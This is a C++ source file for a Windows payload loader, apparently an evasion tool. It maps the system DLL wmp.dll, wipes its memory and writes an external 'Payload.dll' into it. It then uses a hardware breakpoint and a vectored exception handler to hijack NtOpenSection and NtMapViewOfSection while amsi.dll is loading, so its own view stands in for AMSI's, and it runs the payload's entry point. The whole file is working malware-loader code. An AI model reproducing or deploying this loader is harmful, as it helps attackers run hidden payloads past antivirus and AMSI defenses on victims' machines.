#include<Windows.h>
#include<winternl.h>
#include<winnt.h>
#include <cstdio>

typedef NTSTATUS (NTAPI* fnNtOpenSection)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
typedef NTSTATUS (NTAPI* fnNtCreateSection)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
typedef NTSTATUS (NTAPI* fnNtMapViewOfSection)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
typedef PIMAGE_NT_HEADERS (NTAPI* fnRtlImageNtHeader)(PVOID Base);
typedef NTSTATUS (NTAPI* fnNtContinue)(PCONTEXT ContextRecord, BOOLEAN TestAlert);

HMODULE hNtdll = nullptr;
HANDLE gHandle = nullptr;
PVOID gBaseAddress = nullptr;
SIZE_T gViewSize = 0;

fnNtOpenSection NtOpenSection = nullptr;
fnNtCreateSection NtCreateSection = nullptr;
fnNtMapViewOfSection NtMapViewOfSection = nullptr;
fnRtlImageNtHeader RtlImageNtHeader = nullptr;
fnNtContinue NtContinue = nullptr;

enum LdrState {
	StateOpenSection = 1,
	StateMapViewOfSection = 2,
};

LdrState gLdrState = LdrState::StateOpenSection;


typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

VOID* MyGetProcAddress(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);

BOOL CheckForwardedExport(_In_ DWORD RVA, _In_ IMAGE_OPTIONAL_HEADER OptHeader) {
	return  (RVA >= OptHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
		&& RVA < OptHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + OptHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size);
}

VOID* ForwardedExport(_In_ const CHAR* pForwardStr) {
	const CHAR* dot = strchr(pForwardStr, '.');
	CHAR pDll[MAX_PATH] = { 0 };
	CHAR pFunctionName[MAX_PATH] = { 0 };
	memcpy(pDll, pForwardStr, dot - pForwardStr);
	strcat_s(pDll, MAX_PATH, ".dll");
	strcpy_s(pFunctionName, MAX_PATH, dot + 1);

	HMODULE hMod = LoadLibraryA(pDll);

	//Ordinal forwarded export 
	if (pFunctionName[0] == '#') {
		WORD ord = (WORD)atoi(pFunctionName + 1);
		return MyGetProcAddress(hMod, (LPCSTR)ord);
	}

	return MyGetProcAddress(hMod, pFunctionName);
}

VOID* MyGetProcAddress(_In_ HMODULE hModule, _In_ LPCSTR lpProcName) {
	BYTE* pBase = (BYTE*)hModule;
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBase;
	PIMAGE_NT_HEADERS64 pNtHeaer = (PIMAGE_NT_HEADERS)(pBase + pDosHeader->e_lfanew);
	IMAGE_OPTIONAL_HEADER64 OptHeader = pNtHeaer->OptionalHeader;
	IMAGE_FILE_HEADER FileHeader = pNtHeaer->FileHeader;

	PIMAGE_EXPORT_DIRECTORY ExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + OptHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	DWORD* pdwNameAddr = (DWORD*)(pBase + ExportDir->AddressOfNames);
	DWORD* pdwFunctions = (DWORD*)(pBase + ExportDir->AddressOfFunctions);
	WORD* pwOrdinals = (WORD*)(pBase + ExportDir->AddressOfNameOrdinals);

	// find function by ordinal
	if ((ULONG_PTR)lpProcName <= 0xFFFF) {
		WORD wOrg = (WORD)lpProcName - ExportDir->Base;
		DWORD dwFunctionRVA = pdwFunctions[wOrg];
		if (CheckForwardedExport(dwFunctionRVA, OptHeader)) {
			return ForwardedExport((const CHAR*)(dwFunctionRVA + pBase));
		}
		return (VOID*)(pBase + dwFunctionRVA);
	}

	// find function by name
	for (int i = 0; i < ExportDir->NumberOfNames; i++) {
		CHAR* pFuncName = (CHAR*)(pBase + pdwNameAddr[i]);
		if (!strcmp(pFuncName, lpProcName)) {
			WORD ordinal = pwOrdinals[i];
			DWORD dwFunctionRVA = pdwFunctions[ordinal];

			if (CheckForwardedExport(dwFunctionRVA, OptHeader)) {
				return ForwardedExport((const CHAR*)(dwFunctionRVA + pBase));
			}

			return (VOID*)(pBase + dwFunctionRVA);
		}
	}
	return nullptr;
}

VOID InitWinAPI() {
	NtOpenSection = (fnNtOpenSection)MyGetProcAddress(hNtdll, "NtOpenSection");
	NtCreateSection = (fnNtCreateSection)MyGetProcAddress(hNtdll, "NtCreateSection");
	NtMapViewOfSection = (fnNtMapViewOfSection)MyGetProcAddress(hNtdll, "NtMapViewOfSection");
	RtlImageNtHeader = (fnRtlImageNtHeader)MyGetProcAddress(hNtdll, "RtlImageNtHeader");
	NtContinue = (fnNtContinue)MyGetProcAddress(hNtdll, "NtContinue");
}


DWORD RvaToFoa(DWORD rva, PIMAGE_NT_HEADERS nt)
{
	PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

	for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++)
	{
		DWORD va = sec->VirtualAddress;
		DWORD size = max(sec->Misc.VirtualSize, sec->SizeOfRawData);

		if (rva >= va && rva < va + size)
		{
			return rva - va + sec->PointerToRawData;
		}
	}

	return DWORD(-1);
}



VOID FixRelocation(PVOID pMemBase, PVOID pBaseAddress) {
	PIMAGE_NT_HEADERS pNt = RtlImageNtHeader(pMemBase);
	ULONGLONG delta = (ULONGLONG)pMemBase - pNt->OptionalHeader.ImageBase;
	if (delta == 0) {
		return;
	}
	//printf("Delta = 0x%llx\n", delta);
	PIMAGE_DATA_DIRECTORY pRelocDir = &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	//DWORD dwFOA = RvaToFoa(pRelocDir->VirtualAddress, pNt);
	PIMAGE_BASE_RELOCATION pRelocBaseBlock = (PIMAGE_BASE_RELOCATION)((ULONGLONG)pMemBase + pRelocDir->VirtualAddress);
	//PIMAGE_BASE_RELOCATION pRelocBaseBlock = (PIMAGE_BASE_RELOCATION)((ULONGLONG)pBaseAddress + dwFOA);
	for (ULONG offset = 0; offset < pRelocDir->Size; offset = offset + pRelocBaseBlock->SizeOfBlock) {
		pRelocBaseBlock = (PIMAGE_BASE_RELOCATION)((ULONGLONG)pMemBase + pRelocDir->VirtualAddress + offset);
		PBASE_RELOCATION_ENTRY pRelcEntry = (PBASE_RELOCATION_ENTRY)((ULONGLONG)pRelocBaseBlock + sizeof(IMAGE_BASE_RELOCATION));
		ULONG EntryCount = (pRelocBaseBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
		for (ULONG i = 0; i < EntryCount; i++) {
			if (pRelcEntry[i].Type != IMAGE_REL_BASED_DIR64) continue;
			ULONGLONG* ullBuffer = (ULONGLONG*)((ULONGLONG)pMemBase + pRelocBaseBlock->VirtualAddress + pRelcEntry[i].Offset);
			*ullBuffer += delta;
			//printf("Relocated Address: 0x%llx\n", *ullBuffer);
		}
	}
	return;
}


VOID SetProtection(PVOID pMemBase, BYTE* pFileData) {
	PIMAGE_NT_HEADERS pNt = RtlImageNtHeader(pMemBase);
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNt);
	for (size_t i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
		
		PVOID pSectionDest = (PVOID)((DWORD64)pMemBase + pSectionHeader->VirtualAddress);
		DWORD oldProtect = 0;
		DWORD newProtect = 0;
		if (pSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
			if (pSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) {
				newProtect = PAGE_EXECUTE_READWRITE;
			}
			else if (pSectionHeader->Characteristics & IMAGE_SCN_MEM_READ) {
				newProtect = PAGE_EXECUTE_READ;
			}
			else {
				newProtect = PAGE_EXECUTE;
			}
		}
		else {
			if (pSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) {
				newProtect = PAGE_READWRITE;
			}
			else if (pSectionHeader->Characteristics & IMAGE_SCN_MEM_READ) {
				newProtect = PAGE_READONLY;
			}
			else {
				newProtect = PAGE_NOACCESS;
			}
		}
		VirtualProtect(pSectionDest, pSectionHeader->Misc.VirtualSize, newProtect, &oldProtect);
		pSectionHeader++;
	}
}


BOOL SetHardwareBreakpoint(PVOID address, PCONTEXT ctx) {
	if (ctx) {
		ctx->Dr0 = (DWORD64)address;
		ctx->Dr7 = 1;
		//ctx->Dr6 = 0;
		return TRUE;
	}
	else {
		CONTEXT context = { 0 };
		context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
		HANDLE hThread = GetCurrentThread();
		if (!GetThreadContext(hThread, &context)) return FALSE;

		context.Dr0 = (DWORD64)address;
		context.Dr7 = 1;

		if (!SetThreadContext(hThread, &context)) {
			return FALSE;
		}
		return TRUE;
	}
}

BOOL CALLBACK VectoredHandler(PEXCEPTION_POINTERS ExceptionInfo) {
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
		PCONTEXT ctx = ExceptionInfo->ContextRecord;
		if (gLdrState == LdrState::StateOpenSection) {
			*(PHANDLE)ctx->Rcx = gHandle;
			ctx->Rax = 0;
			BYTE* rip = (BYTE*)ctx->Rip;
			while (*rip != 0xc3) {
				rip++;
			}
			ctx->Rip = (ULONG_PTR)rip;
			gLdrState = LdrState::StateMapViewOfSection;
			SetHardwareBreakpoint(NtMapViewOfSection, ctx);
			NtContinue(ctx, FALSE);
		}
		//else if (gLdrState == LdrState::StateMapViewOfSection) 
		else {
			if ((HANDLE)ctx->Rcx != gHandle) {
				return EXCEPTION_CONTINUE_EXECUTION;
			}
			PVOID* baseAddrPtr = (PVOID*)ctx->R8;
			PSIZE_T viewSizePtr = *(PSIZE_T*)(ctx->Rsp + 0x38);
			ULONG* allocTypePtr = (ULONG*)(ctx->Rsp + 0x48);
			ULONG* protectPtr = (ULONG*)(ctx->Rsp + 0x50);

			if (baseAddrPtr) {
				*baseAddrPtr = gBaseAddress;
			}
			if (viewSizePtr) {
				*viewSizePtr = gViewSize;
			}
			

			*allocTypePtr = 0;
			*protectPtr = PAGE_EXECUTE_READWRITE;

			ctx->Rax = 0;
			BYTE* rip = (BYTE*)ctx->Rip;
			while (*rip != 0xc3) {
				rip++;
			}
			ctx->Rip = (ULONG_PTR)rip;
			//ULONGLONG ullRetAddr = *(ULONGLONG*)(ctx->Rsp);
			//ctx->Rip = ullRetAddr;
			//ctx->Rsp += 8;

			ctx->Dr0 = 0LL;
			ctx->Dr1 = 0LL;
			ctx->Dr2 = 0LL;
			ctx->Dr3 = 0LL;
			ctx->Dr6 = 0LL;
			ctx->Dr7 = 0LL;
			ctx->EFlags |= 0x10000u;

			NTSTATUS status = NtContinue(ctx, FALSE);
			if (status < 0) {
				printf("NtContinue failed in VectoredHandler, NTSTATUS: 0x%llx\n", status);
			}
			NtContinue(ctx, FALSE);
		}
		
		
	}
	return EXCEPTION_CONTINUE_EXECUTION;
}

BOOL MovePayloadToMemory(PVOID pDest, BYTE* pPayloadData, DWORD dwPayloadSize) {
	PIMAGE_NT_HEADERS pNt = RtlImageNtHeader(pPayloadData);
	memcpy(pDest, pPayloadData, pNt->OptionalHeader.SizeOfHeaders);
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNt);
	for (size_t i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
		PVOID pSectionDest = (PVOID)((DWORD64)pDest + pSectionHeader->VirtualAddress);
		PVOID pSectionSrc = (PVOID)((DWORD64)pPayloadData + pSectionHeader->PointerToRawData);
		memcpy(pSectionDest, pSectionSrc, pSectionHeader->SizeOfRawData);
		pSectionHeader++;
	}
	return TRUE;
}



int main() {
	hNtdll = GetModuleHandleA("ntdll.dll");
	InitWinAPI();
	//load payload
	char szPayload[MAX_PATH] = { 0 };
	GetModuleFileNameA(NULL, szPayload, MAX_PATH);
	char* p = strrchr(szPayload, '\\');
	if (p)
	{
		*(p + 1) = '\0';
	}
	strcat_s(szPayload, "Payload.dll");
	//printf("Payload path: %s\n", szPayload);
	HANDLE hPayloadHandle = CreateFileA(szPayload, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwPayloadSize = GetFileSize(hPayloadHandle, NULL);
	BYTE* pPlayloadData = new BYTE[dwPayloadSize + 1];
	memset(pPlayloadData, 0, dwPayloadSize + 1);
	if (!ReadFile(hPayloadHandle, pPlayloadData, dwPayloadSize, nullptr, nullptr)) {
		printf("Fail to read payload. Error: 0x%08x", GetLastError());
		return -1;
	}
	CloseHandle(hPayloadHandle);

	char pWmpPath[] = "C:\\Windows\\System32\\wmp.dll";
	HANDLE hWmpHandle = CreateFileA(pWmpPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hWmpHandle == INVALID_HANDLE_VALUE) {
		printf("Failed to open file. Error code: %lu\n", GetLastError());
		return -1;
	}
	HANDLE hSection = nullptr;
	NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hWmpHandle);
	if (status < 0 ) {
		printf("Failed to create wmp.dll section, NTSTATUS: 0x%08x\n", status);
		return -1;
	}
	CloseHandle(hWmpHandle);

	PVOID pBaseAddress = nullptr;
	SIZE_T ViewSize = 0;
	NtMapViewOfSection(hSection, GetCurrentProcess(), &pBaseAddress, 0, 0, NULL, &ViewSize, 1, 0, PAGE_READWRITE);
	if (!pBaseAddress) {
		printf("Failed to map wmp.dll section into memory, BaseAddress: 0x%08x\n", pBaseAddress);
		return -1;
	}
	PIMAGE_NT_HEADERS pWmpNtHeader = RtlImageNtHeader(pBaseAddress);
	//clear wmp.dll's memory
	DWORD dwImageSize = pWmpNtHeader->OptionalHeader.SizeOfImage;
	//DWORD dwImageSize = RtlImageNtHeader(pPlayloadData)->OptionalHeader.SizeOfImage;
	DWORD dwOldProtect = 0;
	if (!VirtualProtect(pBaseAddress, dwImageSize, PAGE_READWRITE, &dwOldProtect)) {
		printf("Failed to change memory protection. Error code: %lu\n", GetLastError());
		return -1;
	}
	memset(pBaseAddress, 0, dwImageSize);
	//Read payload to the wmp.dll's memory
	MovePayloadToMemory(pBaseAddress, pPlayloadData, dwPayloadSize);
	FixRelocation(pBaseAddress, pPlayloadData);
	SetProtection(pBaseAddress, pPlayloadData);
	PIMAGE_NT_HEADERS pPayloadNtHeader = RtlImageNtHeader(pPlayloadData);
	DWORD entry_point = pPayloadNtHeader->OptionalHeader.AddressOfEntryPoint;
	delete pPlayloadData;
	gHandle = hSection;
	gViewSize = ViewSize;
	gBaseAddress = pBaseAddress;
	AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)VectoredHandler);
	if (!SetHardwareBreakpoint(NtOpenSection, nullptr)) {
		printf("Fail to set bp\n");
		return -1;
	}
	HANDLE handle = LoadLibraryA("amsi.dll");
	if (!handle) {
		printf("Fail to load amsi.dll. Error: 0x%08x", GetLastError());
		return -1;
	}
	RemoveVectoredExceptionHandler(VectoredHandler);

	PVOID EP = (PVOID)((DWORD64)pBaseAddress + entry_point);
	((VOID(*)())EP)();
	return 0;
}